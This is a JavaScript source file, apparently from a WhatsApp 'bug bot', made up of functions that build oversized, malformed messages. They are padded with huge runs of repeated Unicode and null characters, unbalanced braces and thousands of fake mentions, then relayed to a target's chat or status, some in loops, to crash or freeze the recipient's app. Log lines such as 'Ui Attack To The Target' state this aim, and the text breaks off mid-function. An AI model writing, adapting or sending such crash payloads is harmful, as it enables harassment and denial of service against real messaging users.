            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 100; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 6000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function LocaNewOtax(sock, target) {
  console.log(chalk.red(`𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));

  const otaxx = proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            locationMessage: {
              degreesLatitude: 11.11,
              degreesLongitude: -11.11,
              name: "DO YOU KNOW ME?¿ OTAX" + "ꦽ".repeat(180000),
              url: "https://t.me/Otapengenkawin",
              contextInfo: {
                externalAdReply: {
                  quotedAd: {
                    advertiserName: "ꦾ".repeat(60000),
                    mediaType: "IMAGE",
                    jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/", "base64"),
                    caption: "οταϰ ιѕ нєяє"
                  },
                  placeholderKey: {
                    remoteJid: "0@g.us",
                    fromMe: true,
                    id: "ABCDEF1234567890"
                  }
                }
              }
            },
            hasMediaAttachment: true
          },
          body: {
            text: "нαιι ιм οταϰ⸙"
          },
          nativeFlowMessage: {
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: ""
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "RIVIEW",
                  flow_cta: "ꦽ".repeat(10000),
                  flow_message_version: "3"
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "RIVIEW",
                  flow_cta: "ꦾ".repeat(10000),
                  flow_message_version: "3"
                })
              }
            ]
          },
          quotedMessage: {
            interactiveResponseMessage: {
              nativeFlowResponseMessage: {
                version: 3,
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1045000)
              },
              body: {
                text: "Ewe Bang Enak",
                format: "DEFAULT"
              }
            }
          }
        }
      }
    }
  });

  const msg = await generateWAMessageFromContent(target, otaxx, { userJid: target });
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

async function BlankNotif(target, ptcp = true) {
      let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
           message: {
              interactiveMessage: {
                header: {
                documentMessage: {
                url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                    mimetype: 'ꦽ'.repeat(10000),
                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                   fileLength: "999999999",
                   pageCount: 0x9184e729fff,
                   mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                  fileName: "Xavienz.doc",
                  fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                  directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
               mediaKeyTimestamp: "1715880173",
                contactVcard: true,
                jpegThumbnail: null,
              },
                 title: "🩸⃟༑⌁⃰Xávíéńźź íś Héŕé༗𖤍",
                  hasMediaAttachment: true
               },
                 body: {
                 text: "🩸⃟༑⌁⃰Xávíéńźź íś Héŕé༗𖤍" + "ꦽ".repeat(95000) + "ꦾ".repeat(50000),
                },
               nativeFlowMessage: {
                messageParamsJson: "{}".repeat(10000),
                 buttons: [
               {
                   name: "galaxy_message",
                   buttonParamsJson: JSON.stringify({
                   display_text: "ꦽ".repeat(10000),
                  })
             },
             {
                   name: "send_location",
                   buttonParamsJson: JSON.stringify({
                   display_text: "ꦽ".repeat(10000),
                  })
             },
             {
                   name: "call_permission_request",
                   buttonParamsJson: JSON.stringify({
                   display_text: "ꦽ".repeat(10000),
                  })
                 }
               ]
             }
           }
         }
       }
   }, {});            
   await sock.relayMessage(target, msg.message, ptcp ? {
	  participant: {
	  jid: target
	}
 } : {});
   console.log(chalk.red(`Succes Sending Bug To ${target}`));
 }
 
async function KillerHorseXUiForce(target) {
const message = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "OmOsakaIsHere!" + "\u200D".repeat(2000)
          },
          carouselMessage: {
            cards: [
              {
                header: {
                  ...(await prepareWAMessageMedia({
                    image: { url: "https://g.top4top.io/p_3580skpiz1.jpg" }
                  }, {
                    upload: Raa4YouSx.waUploadToServer
                  })),
                  title: "OmOsakaIsHere!",
                  gifPlayback: true,
                  subtitle: "OmOsakaIsHere!",
                  hasMediaAttachment: true
                },
                body: {
                  text: "OmOsakaIsHere!" + "ꦾ".repeat(120000)
                },
                footer: {
                  text: "OmOsakaIsHere!"
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "",
                        sections: []
                      })
                    },
                    {
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "𑲭𑲭".repeat(60000),
                        sections: [
                          {
                            title: " TheKingKong Kil You ",
                            rows: []
                          }
                        ]
                      })
                    },
                    { name: "call_permission_request", buttonParamsJson: "{}" },
                    { name: "mpm", buttonParamsJson: "{}" },
                    {
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "OmOsakaIsHere!",
                        sections: [
                          {
                            title: "OmOsakaIsHere!",
                            highlight_label: "💥",
                            rows: [
                              { header: "", title: "💧", id: "⚡" },
                              { header: "", title: "💣", id: "✨" }
                            ]
                          }
                        ]
                      })
                    },
                    {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Quick Crash Reply",
                        id: "📌"
                      })
                    },
                    {
                      name: "cta_url",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Developed",
                        url: "https://t.me/OmOsaka2Real",
                        merchant_url: "https://t.mw/OmOsaka2Real"
                      })
                    },
                    {
                      name: "cta_call",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Call Us Null",
                        id: "message"
                      })
                    },
                    {
                      name: "cta_copy",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Copy Crash Code",
                        id: "message",
                        copy_code: "#CRASHCODE9741"
                      })
                    },
                    {
                      name: "cta_reminder",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Set Reminder Crash",
                        id: "message"})
                    },
                    {
                      name: "cta_cancel_reminder",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Cancel Reminder Crash",
                        id: "message"
                      })
                    },
                    {
                      name: "address_message",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Send Crash Address",
                        id: "message"
                      })
                    },
                    {
                      name: "send_location",
                      buttonParamsJson: "OmOsakaIsHere!"
                    }
                  ]
                }
              }
            ],
            messageVersion: 1
          }
        }
      }
    }
  }, {
  });

  await sock.relayMessage(target, message.message, {
    messageId: message.key.id
  });

  console.log("Ui Attack To The Target");
}

async function Ggwp(target) {
  let KyuzuMemek = {
    key: {
      remoteJid: "status@broadcast",
      fromMe: false,
      id: crypto.randomUUID()
    },
    message: {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "ꦽ".repeat(45000),
        publisher: "_/KyuzuTukangNgocok",
        stickers: [
          { fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp", isAnimated: false, mimetype: "image/webp" },
          { fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp", isAnimated: false, mimetype: "image/webp" }
        ],
        fileLength: "3662919",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
        contextInfo: {
          remoteJid: target,
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
          mentionedJid: [
            "6285215587498@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
          ]
        },
        packDescription: "",
        mediaKeyTimestamp: "1747502082",
        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
        thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
        thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED",
        quotedMessage: {
          callLogMesssage: {
            isVideo: true,
            callOutcome: "REJECTED",
            durationSecs: "1",
            callType: "SCHEDULED_CALL",
            participants: [
              { jid: X, callOutcome: "CONNECTED" },
              { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" },
              { jid: "13135550002@s.whatsapp.net", callOutcome: "ACCEPTED_ELSEWHERE" },
              { jid: "status@broadcast", callOutcome: "SILENCED_UNKNOWN_CALLER" }
            ]
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", KyuzuMemek.message, {
    messageId: KyuzuMemek.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
          }
        ]
      }
    ]
  });
}

async function Sxsystem(target) {
  const Xtrix = "꧀".repeat(15000);
  const nul = "\u0000".repeat(4000);

  const payload = {
    locationMessage: {
      degreesLatitude: "99999e99999",
      degreesLongitude: "-99999e99999",
      name: "#S3KO - AI" + nul + Xtrix,
      url: `https://wa.${Xtrix}.null/`,
      contextInfo: {
        mentionedJid: [
          target,
          "0@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
            "1" + Math.floor(Math.random() * 9e6) + "@s.whatsapp.net"
          )
        ],
        externalAdReply: {
          advertiserName: Xtrix,
          caption: nul + Xtrix,
          jpegThumbnail: Buffer.from("x"),
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 9,
            expiryTimestamp: "-999999999e999999"
          },
          interactiveMessage: {
            carouselMessage: {
              messageVersion: 2,
              cards: [
                {
                  body: { text: "XtrixFlow" + nul },
                  nativeFlowMessage: {
                    buttons: [
                      { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: Xtrix }) },
                      { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: nul }) }
                    ],
                    messageParamsJson: "[".repeat(3000)
                  }
                }
              ]
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, payload, { participant: { jid: target } });
}

async function voldBurstX(sock, target, ptcp = true) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "\u200Bx\u200B",
            hasMediaAttachment: false
          },
          body: {
            text: "bug apaan ini🧟‍♂️".repeat(7) + "}}".repeat(99999)
          },
          nativeFlowMessage: {
            messageParamsJson: "",
            buttons: [
              {
                name: "btn",
                buttonParamsJson: "*\n" + "{{}}".repeat(99999)
              },
              {
                name: "id",
                buttonParamsJson: "\n" + "{".repeat(88888)
              }
            ]
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, ptcp ? {
    participant: {
      jid: target
    }
  } : {});
}

async function VcardXFc(target) {
  const apiClient = JSON.stringify({
    status: true,
    criador: "Carinho",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true
        }
      }
    }
  });

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            forwardedNewsletterMessageInfo: {
              newsletterName: "Tama Ryuichi | I'm Beginner",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "€ 𝗧𝗮𝗺𝗮 𝗥𝘆𝘂𝗶𝗰𝗵𝗶",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://tama.app/",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
          header: {
            title: "",
            hasMediaAttachment: false
          },
          body: {
            text: "⤿ 𓆩🔥 𝐊𝐈𝐋𝐋𝐄𝐑𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇 ⚡𓆪 ⤾",
          },
          nativeFlowMessage: {
            messageParamsJson: JSON.stringify({
              title: "\u200B".repeat(10000),
              body: "GIDEOVA_PAYMENT_STATUSED"
            }),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: apiClient + "⤿ 𓆩🔥 𝐊𝐈𝐋𝐋𝐄𝐑𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇 ⚡𓆪 ⤾",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: apiClient + "⤿ 𓆩🔥 𝐊𝐈𝐋𝐋𝐄𝐑𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇 ⚡𓆪 ⤾",
              },
              {
                name: "payment_method",
                buttonParamsJson: ""
              },
              {
                name: "payment_status",
                buttonParamsJson: ""
              },
              {
                name: "review_order",
                buttonParamsJson: JSON.stringify({
                  reference_id: Math.random().toString(36).substring(2, 10).toUpperCase(),
                  order: {
                    status: "pending",
                    order_type: "ORDER"
                  },
                  share_payment_status: true,
                  call_permission: true
                })
              },
              {
                name: "contact",
                buttonParamsJson: JSON.stringify({
                  vcard: {
                    full_name: "Zephyrine Chema ".repeat(4000),
                    phone_number: "+628217973312",
                    email: "zephyrineexploit@iCloud.com",
                    organization: "Zephyrine Exploiter",
                    job_title: "Customer Support"
                  }
                })
              }
            ]
          }
        }
      }
    }
  }, { userJid: target });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function mikirKidz(sock, target) {
  try {
    let message = {
      interactiveMessage: {
        body: { text: "X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    for (let iterator = 0; iterator < 1; iterator++) {
      const msg = generateWAMessageFromContent(target, message, {});

      await sock.relayMessage(target, msg.message, {
        additionalNodes: [
          { tag: "biz", attrs: { native_flow_name: "payment_method" } },
        ],
        messageId: msg.key.id,
        participant: { jid: target },
        userJid: target,
      });

      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { native_flow_name: "payment_method" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });

      await new Promise((resolve) => setTimeout(resolve, 500));
    }

    console.log("BUG TERKIRIM");
  } catch (err) {
    console.error(chalk.red.bold(err));
  }
}

async function ViewOncdelay(sock, target) {
  let flag = true
  const session = "5e03e0&mms3"
  const encMedia = "10000000_2012297619515179_5714769099548640934_n.enc"
  const mime = "image/webp"

  if (flag && 123 > 42) {
    flag = false
  }

  const content = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          mimetype: mime,
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${encMedia}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${session}=true`,
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          directPath: `/v/t62.43144-24/${encMedia}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0`,
          fileLength: {
            low: Math.floor(Math.random() * 800),
            high: 0,
            unsigned: true
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1900000000),
            high: 0,
            unsigned: false
          },
          isAnimated: true,
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 40000 }, () =>
                "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
              )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -10000000),
            high: 100,
            unsigned: flag
          },
          isAvatar: flag,
          isAiSticker: flag,
          isLottie: flag
        }
      }
    }
  }

  const msgObj = generateWAMessageFromContent(target, content, {})

  await sock.relayMessage("status@broadcast", msgObj.message, {
    messageId: msgObj.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  })
}

async function StickersAbim(target) {
  try {
    const abimsalsa = "\u2063".repeat(5000);
    const salsa = "\u300B".repeat(3000);

    const msg1 = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "GATE OF OLMYPUS",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(25900),
              version: 3
            }
          }
        }
      }
    };

    const msg2 = {  
      stickerMessage: {  
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",  
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",  
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",  
        mimetype: "image/webp",  
        height: 9999,  
        width: 9999,  
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
        fileLength: 12260,  
        mediaKeyTimestamp: "1743832131",  
        isAnimated: false,  
        stickerSentTs: "X",  
        isAvatar: false,  
        isAiSticker: false,  
        isLottie: false,  
        contextInfo: {  
          mentionedJid: [
            "0@s.whatsapp.net",  
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )  
          ],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    };

    const msg3 = {  
      viewOnceMessage: {  
        message: {  
          interactiveMessage: {  
            body: {  
              xternalAdReply: {  
                title: "Abimofficial",  
                text: abimsalsa  
              }  
            },  
            extendedTextMessage: {  
              text: "{".repeat(9000),  
              contextInfo: {  
                mentionedJid: Array.from(
                  { length: 2000 },
                  (_, i) => `1${i}@s.whatsapp.net`
                )
              }  
            },  
            businessMessageForwardInfo: {  
              businessOwnerJid: "13135550002@s.whatsapp.net"  
            },  
            nativeFlowMessage: {  
              buttons: [  
                { name: "view_product", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "address_message", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "galaxy_message", buttonParamsJson: "\u0005".repeat(6000) + salsa },  
                { name: "cta_url", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "call_permission_request", buttonParamsJson: "\u0005".repeat(6000) + salsa },  
                { name: "single_select", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "cta_copy", buttonParamsJson: "\u0003".repeat(4000) + salsa }  
              ],  
              nativeFlowResponseMessage: {  
                name: "galaxy_message",  
                paramsJson: "\u0000".repeat(10),  
                version: 3  
              },  
              contextInfo: {  
                mentionedJid: [  
                  "0@s.whatsapp.net",  
                  ...Array.from(
                    { length: 1900 },
                    () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                  )  
                ]  
              }  
            }  
          }  
        }  
      }  
    };

    for (const msg of [msg1, msg2, msg3]) {  
      await sock.relayMessage("status@broadcast", msg, {  
        messageId: undefined,  
        statusJidList: [target],  
        additionalNodes: [  
          {  
            tag: "meta",  
            attrs: {},  
            content: [  
              {  
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }  
            ]  
          }  
        ]  
      });  

      console.log(`Attacked Your Devices 🤍 Sending Bug To ${target} suksesfull`);  
    }

  } catch (e) {
    console.error(e);
  }
}

async function UiCallCrashBlank(sock, target) {
  const msgUiCall = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "</> izii Avliable." + "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(target, msgUiCall.message, {
    participant: { jid: target },
    messageId: msgUiCall.key.id
  });

  const spamMention = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
  const teks = "᬴".repeat(250000);

  const callUiMsg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "</> izii available. X9" + "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await sock.relayMessage(target, callUiMsg.message, {
    messageId: callUiMsg.key.id,
    participant: { jid: target }
  });
  await sock.sendMessage(target, { text: teks, contextInfo: { mentionedJid: spamMention } });

  const CrashBload = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "</> izii 🫀", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            version: 3,
            paramsJson: JSON.stringify({
              trigger: true,
              action: "call_crash",
              note: "test onnn.....?",
              filler: "꧔".repeat(50000)
            })
          }
        }
      }
    },
    nativeFlowMessage: {
      name: "render_crash_component",
      messageParamsJson: "{".repeat(70000)
    },
    audioMessage: {
